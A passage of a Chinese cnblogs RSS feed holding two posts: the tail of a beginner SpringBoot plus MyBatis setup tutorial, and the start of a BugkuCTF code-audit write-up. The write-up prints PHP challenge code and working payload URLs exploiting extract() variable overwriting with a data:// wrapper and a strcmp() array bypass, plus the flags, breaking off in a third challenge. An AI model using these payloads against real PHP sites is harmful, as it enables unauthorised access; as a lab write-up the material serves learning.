&lt;p&gt;由于后期我们要集成mybatis，所以我们勾选mybatis&lt;/p&gt;
&lt;p&gt;由于我们的数据库是5.7，那么我们要勾选mysql&lt;/p&gt;
&lt;p&gt;勾选完成后点击next，如下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190215232929511-1042587340.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;此处提示我们输入一些工程信息，那么，作为初学者，点击next就好，不要在意这些细节...&lt;/p&gt;
&lt;p&gt;点击之后效果如图，请点击右下角Enable Auto-Import ，允许编译器在你改变pom文件后自动导入包，另外，左侧显示的三处不必要的文件和文件夹可以删除，如图所示&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190215233427290-1248190169.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;完成上述步骤之后，项目结构及pom文件如下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190215233614951-2065784886.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 至此一个SpringBoot项目构建完成，我们可以编写一个小小的demo来测试SpringBoot&lt;/p&gt;
&lt;p&gt;3.SpringBoot 测试&lt;/p&gt;
&lt;p&gt;首先在pom文件中添加如下依赖（非常重要的一个依赖）&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.springframework.boot&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;spring-boot-starter-web&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 由于我们暂时没有实体类与jdbc连接，所以我们必须要将pom文件中有关mysql与mybatis的pom依赖注释掉，如图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190216000046773-995013577.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;在demo包下，新建controller包，并新建一个类GirlFriendController，程序员有对象真的很容易啊，随手就能new一个...代码如下&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.example.demo.controller;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.web.bind.annotation.RequestMapping;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.web.bind.annotation.RestController;

@RestController
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; GirlFriendController {
    
    @RequestMapping(&lt;/span&gt;&quot;/getgirlfriend&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getGirlFriend(){
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &quot;No way ...&quot;&lt;span&gt;;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190215235632878-363024872.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 然后我们找到编译器为我们生成的主类，或者叫入口类，然后点击运行main方法，如图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190215235802107-1212202064.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 项目成功启动后，我们在浏览器输入  http://localhost:8080/getgirlfriend ，就能返回结果（此处不需要输入项目名称）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190216000330820-222417558.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;至此，SpringBoot框架搭建成功，下一步就是整合mybatis&lt;/p&gt;
&lt;p&gt;4.整合mybatis&lt;/p&gt;
&lt;p&gt;将我们之前注释掉的pom文件中的依赖放开，将注意力转至mysql数据库与mybatis上&lt;/p&gt;
&lt;p&gt;首先，使用navcat打开mysql数据库并建立一张表girlfriend&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190216001133594-1019229624.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 我们插入一条测试数据&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190216001242794-1292690021.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 女神艾莉丝，19岁好吧，各位绅士，建表及测试数据脚本如下&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;SET&lt;/span&gt;&lt;span&gt; NAMES utf8mb4;
&lt;/span&gt;&lt;span&gt;SET&lt;/span&gt; FOREIGN_KEY_CHECKS &lt;span&gt;=&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

&lt;/span&gt;&lt;span&gt;--&lt;/span&gt;&lt;span&gt; ----------------------------&lt;/span&gt;&lt;span&gt;
--&lt;/span&gt;&lt;span&gt; Table structure for girlfriend&lt;/span&gt;&lt;span&gt;
--&lt;/span&gt;&lt;span&gt; ----------------------------&lt;/span&gt;
&lt;span&gt;DROP&lt;/span&gt; &lt;span&gt;TABLE&lt;/span&gt; &lt;span&gt;IF&lt;/span&gt; &lt;span&gt;EXISTS&lt;/span&gt;&lt;span&gt; `girlfriend`;
&lt;/span&gt;&lt;span&gt;CREATE&lt;/span&gt; &lt;span&gt;TABLE&lt;/span&gt;&lt;span&gt; `girlfriend`  (
  `id` &lt;/span&gt;&lt;span&gt;varchar&lt;/span&gt;(&lt;span&gt;255&lt;/span&gt;) &lt;span&gt;CHARACTER&lt;/span&gt; &lt;span&gt;SET&lt;/span&gt; utf8 COLLATE utf8_general_ci &lt;span&gt;NOT&lt;/span&gt; &lt;span&gt;NULL&lt;/span&gt;&lt;span&gt;,
  `name` &lt;/span&gt;&lt;span&gt;varchar&lt;/span&gt;(&lt;span&gt;255&lt;/span&gt;) &lt;span&gt;CHARACTER&lt;/span&gt; &lt;span&gt;SET&lt;/span&gt; utf8 COLLATE utf8_general_ci &lt;span&gt;DEFAULT&lt;/span&gt; &lt;span&gt;NULL&lt;/span&gt;&lt;span&gt;,
  `age` &lt;/span&gt;&lt;span&gt;varchar&lt;/span&gt;(&lt;span&gt;255&lt;/span&gt;) &lt;span&gt;CHARACTER&lt;/span&gt; &lt;span&gt;SET&lt;/span&gt; utf8 COLLATE utf8_general_ci &lt;span&gt;DEFAULT&lt;/span&gt; &lt;span&gt;NULL&lt;/span&gt;&lt;span&gt;,
  &lt;/span&gt;&lt;span&gt;PRIMARY&lt;/span&gt; &lt;span&gt;KEY&lt;/span&gt;&lt;span&gt; (`id`) USING BTREE
) ENGINE &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; InnoDB &lt;span&gt;CHARACTER&lt;/span&gt; &lt;span&gt;SET&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; utf8 COLLATE &lt;span&gt;=&lt;/span&gt; utf8_general_ci ROW_FORMAT &lt;span&gt;=&lt;/span&gt;&lt;span&gt; Dynamic;

&lt;/span&gt;&lt;span&gt;--&lt;/span&gt;&lt;span&gt; ----------------------------&lt;/span&gt;&lt;span&gt;
--&lt;/span&gt;&lt;span&gt; Records of girlfriend&lt;/span&gt;&lt;span&gt;
--&lt;/span&gt;&lt;span&gt; ----------------------------&lt;/span&gt;
&lt;span&gt;INSERT&lt;/span&gt; &lt;span&gt;INTO&lt;/span&gt; `girlfriend` &lt;span&gt;VALUES&lt;/span&gt; (&lt;span&gt;'&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Alice&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;19&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;);

&lt;/span&gt;&lt;span&gt;SET&lt;/span&gt; FOREIGN_KEY_CHECKS &lt;span&gt;=&lt;/span&gt; &lt;span&gt;1&lt;/span&gt;;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;好的，那么表数据准备完成，下一步准备根据mysql的表实现mybatis相关内容&lt;/p&gt;
&lt;p&gt;我们使用工具来生成&lt;/p&gt;
&lt;p&gt;工具下载地址 https://pan.baidu.com/s/1RvwKlsmpKJQ_PJkuNjiPdw&lt;/p&gt;
&lt;p&gt;下载后解压，解压后进入 Mybatis\mybatis-generator-core-1.3.2\lib 目录，如图所示&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190216002024951-930902466.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;点击进入src目录，删除src目录下的全部文件（这是上次使用产生的实体类与xml，我们不需要）&lt;/p&gt;
&lt;p&gt;编辑 generatorConfig.xml&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190216004423069-976363284.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 编辑完成generatorConfig.xml后，打开启动命令.txt，复制其中第一行或第二行命令，反正都一样...&lt;/p&gt;
&lt;p&gt;然后点击cmd.exe&lt;/p&gt;
&lt;p&gt;然后输入命令，如图，运行后提示成功信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190216003343072-2068230171.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;打开cmd.exe同目录下的src目录，我们会发现下面多了一些东西，如图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190216003506354-377401031.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 没错，他们就是这款工具帮我们生成的实体类，dao类，与xml文件&lt;/p&gt;
&lt;p&gt;接下来我们在项目目录中新建相应的包、文件夹，并将工具帮我们生成的类与文件拷贝至IDEA新建的包或文件夹中&lt;/p&gt;
&lt;p&gt;拷贝完成之后的项目结构如下图所示&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190216004817581-1898756709.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 然后，我们删除IDEA帮我们创建的 application.properties ，新建 application.yml,如图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190216005104716-2115839391.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;配置代码如下&lt;/p&gt;
&lt;pre readability=&quot;8&quot;&gt;
mybatis:&lt;br/&gt;typeAliasesPackage: com.xdd.entity&lt;br/&gt;mapperLocations: classpath:mapping/*.xml&lt;p&gt;spring:&lt;br/&gt;datasource:&lt;br/&gt;url: jdbc:mysql://localhost:3306/test&lt;br/&gt;username: root&lt;br/&gt;password: 123456&lt;br/&gt;driver-class-name: com.mysql.jdbc.Driver&lt;/p&gt;&lt;p&gt;我们新建一个service包与service类，如图
&lt;/p&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190216011931456-539269905.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;代码如下&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
package com.example.demo.service;

import com.example.demo.dao.GirlfriendMapper;
import com.example.demo.entity.Girlfriend;
import org.springframework.beans.factory.annotation.Autowired;&lt;br/&gt;@Service
public class GirlFriendService {

    @Autowired
    private GirlfriendMapper girlfriendMapper;

    public Girlfriend getGirlFriendById(String id){
        return girlfriendMapper.selectByPrimaryKey(id);
    }
}
&lt;/pre&gt;&lt;/div&gt;

&lt;pre&gt;
&lt;br/&gt;然后我们再改造一下 GirlFriendController ，如图
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190216011303404-272651465.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;pre&gt;
代码如下
&lt;/pre&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
package com.example.demo.controller;

import com.example.demo.entity.Girlfriend;
import com.example.demo.service.GirlFriendService;
import org.apache.ibatis.annotations.Param;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class GirlFriendController {

    @Autowired
    private GirlFriendService girlFriendService;

    @RequestMapping(&quot;/getgirlfriend&quot;)
    public Girlfriend getGirlFriend(@Param(&quot;id&quot;) String id){

        Girlfriend girlfriend = girlFriendService.getGirlFriendById(id);

        return girlfriend;
    }
}
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　这时我们看到注入的  girlFriendService 在报错，我们打开编译器 file -》Project Structure -》Facets -》Spring ，然后将Spring(demo) 直接右键删除，确定，报错就解决了&lt;/p&gt;
&lt;pre readability=&quot;5&quot;&gt;
&lt;p&gt;然后我们再编辑入口类 DemoApplication ，添加扫描路径，代码如下
&lt;/p&gt;&lt;/pre&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;36&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
package com.example.demo;

import org.mybatis.spring.annotation.MapperScan;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
@MapperScan(&quot;com.example.demo.dao&quot;)
public class DemoApplication {

    public static void main(String[] args) {
        SpringApplication.run(DemoApplication.class, args);
    }

}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　至此大功告成，我们启动项目，在浏览器中输入 http://localhost:8080/getgirlfriend?id=1 ，就在此时，不料报错。。。。。。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
Caused by: com.mysql.cj.exceptions.InvalidConnectionAttributeException: The server time zone value 'ÖÐ¹ú±ê×¼Ê±¼ä' is unrecognized or represents more than one time zone. You must configure either the server or JDBC driver (via the serverTimezone configuration property) to use a more specifc time zone value if you want to utilize time zone support.
        at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) ~[na:1.8.0_25]
        at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) ~[na:1.8.0_25]
        at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) ~[na:1.8.0_25]
        at java.lang.reflect.Constructor.newInstance(Constructor.java:408) ~[na:1.8.0_25]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　百度才知道这是mysql时区设置问题啊，美帝太坏了...&lt;/p&gt;
&lt;p&gt;打开mysql命令行输入 &lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
show variables &lt;span&gt;like&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;%time_zone%&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;  

&lt;span&gt;set&lt;/span&gt; global time_zone&lt;span&gt;=&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;+8:00&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;;  
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如图 ，搞定&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190216013203644-1585705232.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;再次在浏览器中输入 http://localhost:8080/getgirlfriend?id=1 ，效果如图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190216013310840-422250619.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 啊哈~大功告成&lt;/p&gt;
&lt;p&gt;至此SpringBoot+mybatis框架搭建完成，希望大家多多点赞多多评论&lt;/p&gt;
&lt;p&gt;纯手打，也希望转载能注明出处，感激不尽&lt;/p&gt;
&lt;p&gt;由于本人实在困得不行...所以删除、新增与修改的重任，交给各位绅士....good night            o(*￣▽￣*)ブ&lt;/p&gt;
</description>
<pubDate>Fri, 15 Feb 2019 17:37:00 +0000</pubDate>
<dc:creator>mon小胖</dc:creator>
<og:description>编译器：IDEA2018.2.3 环境：win10，jdk1.8，maven3.4 数据库：mysql 5.7 备注：截图较大，如果看不清，可以在图片上右键=》在新标签页中打开 查看高清大图哦╮(╯▽</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/monxiaopang/p/10386624.html</dc:identifier>
</item>
<item>
<title>BugkuCTF~代码审计~WriteUp - Pretty_girll</title>
<link>http://www.cnblogs.com/prettygirll/p/10386536.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/prettygirll/p/10386536.html</guid>
<description>&lt;p&gt;&lt;strong&gt;&lt;span&gt;第一题：extract变量覆盖&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;知识简介&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;extract()函数语法：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;extract&lt;/span&gt;(&lt;span&gt;array&lt;/span&gt;,extract_rules,&lt;span&gt;prefix)
参数 描述
array必需。 规定要使用的数组。
extract_rules可选。 &lt;/span&gt;&lt;span&gt;extract&lt;/span&gt;&lt;span&gt;() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。
可能的值：
EXTR_OVERWRITE &lt;/span&gt;-&lt;span&gt; 默认。如果有冲突，则覆盖已有的变量。
EXTR_SKIP &lt;/span&gt;-&lt;span&gt; 如果有冲突，不覆盖已有的变量。
EXTR_PREFIX_SAME &lt;/span&gt;-&lt;span&gt; 如果有冲突，在变量名前加上前缀 prefix。
EXTR_PREFIX_ALL &lt;/span&gt;-&lt;span&gt; 给所有变量名加上前缀 prefix。
EXTR_PREFIX_INVALID &lt;/span&gt;-&lt;span&gt;仅在不合法或数字变量名前加上前缀 prefix。
EXTR_IF_EXISTS &lt;/span&gt;-&lt;span&gt; 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。
EXTR_PREFIX_IF_EXISTS &lt;/span&gt;-&lt;span&gt; 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。
EXTR_REFS &lt;/span&gt;-&lt;span&gt; 将变量作为引用提取。导入的变量仍然引用了数组参数的值。
prefix可选。 如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;题目信息&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Topic Link：&lt;a href=&quot;http://123.206.87.240:9009/1.php&quot;&gt;http://123.206.87.240:9009/1.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201902/1594459-20190215180117286-1722707343.png&quot; alt=&quot;&quot; width=&quot;250&quot; height=&quot;328&quot;/&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
http:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;123.206.87.240:9009/1.php&lt;/span&gt;
&amp;lt;?&lt;span&gt;php
&lt;/span&gt;&lt;span&gt;$flag&lt;/span&gt;='xxx'&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;extract&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$shiyan&lt;/span&gt;&lt;span&gt;))
{
&lt;/span&gt;&lt;span&gt;$content&lt;/span&gt;=&lt;span&gt;trim&lt;/span&gt;(&lt;span&gt;file_get_contents&lt;/span&gt;(&lt;span&gt;$flag&lt;/span&gt;&lt;span&gt;));
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;$shiyan&lt;/span&gt;==&lt;span&gt;$content&lt;/span&gt;&lt;span&gt;)
{
&lt;/span&gt;&lt;span&gt;echo&lt;/span&gt;'flag{xxx}'&lt;span&gt;;
}
&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
{
&lt;/span&gt;&lt;span&gt;echo&lt;/span&gt;'Oh.no'&lt;span&gt;;
}
}
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;利用extract()函数的变量覆盖漏洞原理构造payload&lt;/p&gt;
&lt;p&gt;漏洞产生原因：extract()函数当只有一个参数时，默认的第二参数是：EXTR_OVERWRITE，如果有变量发生冲突，则覆盖已有的变量。&lt;/p&gt;
&lt;p&gt;代码审计需要满足两个条件：1. if(isset($shiyan))  == 》 TRUE&lt;/p&gt;
&lt;p&gt;　　　　　　　　　　　　　2. if($shiyan==$content)  == 》 TRUE&lt;/p&gt;
&lt;p&gt;构造payload：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;利用extract()函数变量覆盖漏洞+php伪协议&lt;/span&gt;
&lt;span&gt;
http&lt;/span&gt;:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;123.206.87.240:9009/1.php?shiyan=999&amp;amp;flag=data://,999

//利用file_get_content()函数返回字符串+php弱类型（null == &quot;string&quot;  ==》 true）&lt;/span&gt;
&lt;span&gt;
http&lt;/span&gt;:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;123.206.87.240:9009/1.php?shiyan=&lt;/span&gt;
http:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;123.206.87.240:9009/1.php?shiyan=&amp;amp;flag=&lt;/span&gt;
http:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;123.206.87.240:9009/1.php?shiyan=&amp;amp;content=&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;get flag：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
flag{bugku-dmsj-p2sm3N}
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;第二题：strcmp比较字符串&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;strong&gt;知识简介&lt;/strong&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;strcmp()函数语法：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
int &lt;span&gt;strcmp&lt;/span&gt;( &lt;span&gt;string&lt;/span&gt; &lt;span&gt;$str1&lt;/span&gt;, &lt;span&gt;string&lt;/span&gt; &lt;span&gt;$str2&lt;/span&gt;&lt;span&gt;)

注意该比较区分大小写。 

参数 

str1
第一个字符串。 
str2
第二个字符串。 


返回值 

如果 str1 小于 str2 返回 &lt;/span&gt;&amp;lt; 0；如果 str1 大于 str2 返回 &amp;gt; 0；如果两者相等，返回 0。 
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;题目信息&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Topic Link：&lt;a href=&quot;http://123.206.87.240:9009/6.php&quot;&gt;http://123.206.87.240:9009/6.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201902/1594459-20190215191740996-876509217.png&quot; alt=&quot;&quot; width=&quot;308&quot; height=&quot;328&quot;/&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
&lt;/span&gt;&lt;span&gt;$flag&lt;/span&gt; = &quot;flag{xxxxx}&quot;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['a'&lt;span&gt;])) {
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;strcmp&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['a'], &lt;span&gt;$flag&lt;/span&gt;) == 0) &lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果 str1 小于 str2 返回 &amp;lt; 0； 如果 str1大于 str2返回 &amp;gt; 0；如果两者相等，返回 0。
//比较两个字符串（区分大小写）&lt;/span&gt;
&lt;span&gt;die&lt;/span&gt;('Flag: '.&lt;span&gt;$flag&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt; 'No'&lt;span&gt;;
}
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;利用strcmp()函数不能处理数组的漏洞构造payload&lt;/p&gt;
&lt;p&gt;代码审计需要满足两个条件：1. if (isset($_GET['a'])) ==》 TRUE&lt;/p&gt;
&lt;p&gt;　　　　　　　　　　　　　2. if (strcmp($_GET['a'], $flag) == 0)  ==》 TRUE&lt;/p&gt;
&lt;p&gt;构造payload：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
http:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;123.206.87.240:9009/6.php?a[]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;get flag:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
Flag: flag{bugku_dmsj_912k}
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;第三题：urldecode二次编码绕过&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;知识简介&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;eregi()函数语法：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;eregi&lt;/span&gt;&lt;span&gt; — 不区分大小写的正则表达式匹配

int &lt;/span&gt;&lt;span&gt;eregi&lt;/span&gt;( &lt;span&gt;string&lt;/span&gt; &lt;span&gt;$pattern&lt;/span&gt;, &lt;span&gt;string&lt;/span&gt; &lt;span&gt;$string&lt;/span&gt;[, &lt;span&gt;array&lt;/span&gt; &amp;amp;&lt;span&gt;$regs&lt;/span&gt;&lt;span&gt;] )

本函数和 &lt;/span&gt;&lt;span&gt;ereg&lt;/span&gt;&lt;span&gt;() 完全相同，只除了在匹配字母字符时忽略大小写的区别。 

&lt;/span&gt;&lt;span&gt;ereg&lt;/span&gt;&lt;span&gt;()函数

int &lt;/span&gt;&lt;span&gt;ereg&lt;/span&gt; ( &lt;span&gt;string&lt;/span&gt; &lt;span&gt;$pattern&lt;/span&gt; , &lt;span&gt;string&lt;/span&gt; &lt;span&gt;$string&lt;/span&gt; [, &lt;span&gt;array&lt;/span&gt; &amp;amp;&lt;span&gt;$regs&lt;/span&gt;&lt;span&gt; ] )

以区分大小写的方式在 &lt;/span&gt;&lt;span&gt;string&lt;/span&gt;&lt;span&gt; 中寻找与给定的正则表达式 pattern 所匹配的子串。 

